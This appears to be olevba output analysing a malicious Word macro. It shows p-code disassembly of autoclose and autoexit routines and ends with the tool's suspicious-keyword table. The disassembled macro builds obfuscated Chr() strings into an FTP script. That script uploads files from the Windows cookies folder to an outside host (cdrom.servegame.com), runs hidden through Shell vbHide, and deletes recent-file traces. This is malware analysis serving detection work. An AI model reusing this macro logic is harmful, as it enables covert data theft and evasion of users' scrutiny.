' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	St sn 
' Line #125:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St s2 
' Line #126:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	And 
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld sn 
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #127:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St cx 
' Line #128:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St c2 
' Line #129:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld sn 
' 	Add 
' 	Ld AddToRecentFiles 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #130:
' 	Ld c2 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #131:
' 	Ld c2 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #132:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld sn 
' 	Add 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #133:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	LitStr 0x0004 ".lnk"
' 	Add 
' 	St nome 
' Line #134:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld nome 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	For 
' Line #137:
' 	Ld i 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Add 
' 	Lt 
' 	IfBlock 
' Line #138:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "j"
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 ".lnk"
' 	Add 
' 	St nome 
' Line #140:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #141:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld nome 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	StartForVariable 
' 	Next 
' Line #145:
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub autoclose())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	For 
' Line #150:
' 	Ld i 
' 	Ld RecentFiles 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Add 
' 	Lt 
' 	IfBlock 
' Line #151:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "j"
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	Eq 
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0003 "dot"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #152:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0004 ".lnk"
' 	Add 
' 	St nome 
' Line #153:
' 	Ld i 
' 	ArgsLd RecentFiles 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #154:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld nome 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	StartForVariable 
' 	Next 
' Line #158:
' Line #159:
' 	EndSub 
' Line #160:
' 	FuncDefn (Sub autoexit())
' Line #161:
' 	OnError (Resume Next) 
' Line #162:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #163:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0050 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sn 
' Line #164:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #165:
' Line #166:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0050 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s1 
' Line #167:
' Line #168:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #169:
' 	Ld s1 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "o "
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "dr"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "rvegame"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "om"
' 	Add 
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "us"
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "r n"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vat"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "  "
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "drom"
' 	Add 
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ut "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #176:
' Line #177:
' 	Ld sn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "f"
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 " -n -s:"
' 	Add 
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0067 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "el "
' 	Add 
' 	Ld sv 
' 	Add 
' 	Ld c1 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ".j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	Ld sn 
' 	Add 
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #183:
' 	Ld sn 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #184:
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "cdrom"
' 	Add 
' 	LitStr 0x0004 ".dot"
' 	Add 
' 	LitStr 0x0004 ".lnk"
' 	Add 
' 	St nome 
' Line #187:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld nome 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #188:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "recent"
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "*jpg.lnk"
' 	Add 
' 	St nome 
' Line #189:
' 	LitStr 0x001A "c:\windows\recent\*jpg.lnk"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #190:
' 	Ld nome 
' 	ArgsLd Dir 0x0001 
' 	St ffile 
' Line #191:
' 	LitStr 0x0012 "c:\windows\recent\"
' 	Ld ffile 
' 	Add 
' 	St vv1 
' Line #192:
' 	Ld vv1 
' 	ArgsCall Kill 0x0001 
' Line #193:
' Line #194:
' 	Loop 
' Line #195:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |jpg.lnk             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

